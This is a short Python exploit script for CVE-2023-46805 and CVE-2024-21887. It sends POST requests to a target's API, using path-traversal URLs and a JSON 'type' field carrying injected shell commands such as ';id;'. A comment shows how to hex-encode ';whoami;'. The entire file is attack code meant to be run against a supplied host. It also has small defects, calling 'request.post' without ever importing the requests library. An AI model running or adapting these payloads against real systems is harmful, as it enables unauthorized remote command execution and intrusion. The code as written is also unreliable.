#CVE-2023-46805
def CVE_2023_46805_00(base_url, type_value="id"):
    data = {"type": f";{type_value};"}
    url = f"{base_url}/api/v1/totp/user-backup-code/../../system/system-information"
    print(url)
    try:
        response = request.post(url, json=data, verify=False, timeout=10)
        print(response.headers)
        print(response.status_code)
    except:
        print("serveur injoignable.")

#CVE-2024-21887
def CVE_2024_21887_00(base_url, type_value="id"):
    data = {"type": f";{type_value};"}
    url = f"{base_url}/api/v1/totp/user-backup-code/%2E%2E/%2E%2E/system/maintenance/archiving/cloud-server-test-connection"
    print(url)
    try:
        response = request.post(url, json=data, verify=False, timeout=10)
        print(response.headers)
        print(response.status_code)
    except:
        print("serveur injoignable.")

#$(echo ";whoami;" | xxd -p|tr -d \\n|sed 's/../%&/g')
def CVE_2024_21887_01(base_url, type_value="id"):
    data = {"type": f";{type_value};"}
    url = f"{base_url}/api/v1/totp/user-backup-code/../../license/keys-status/%3b%3b%0a"
    print(url)
    try:
        response = request.post(url, json=data, verify=False, timeout=10)
        print(response.headers)
        print(response.status_code)
    except:
        print("serveur injoignable.")

def CVE_2024_21887_02(base_url, type_value="id"):
    data = {"type": f";{type_value};"}
    url = f"{base_url}/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"
    print(url)
    try:
        response = request.post(url, json=data, verify=False, timeout=10)
        print(response.headers)
        print(response.status_code)
    except:
        print("serveur injoignable.")

import sys
base_url = sys.argv[1]
CVE_2023_46805_00(base_url)
CVE_2024_21887_00(base_url)
CVE_2024_21887_01(base_url)
CVE_2024_21887_02(base_url)
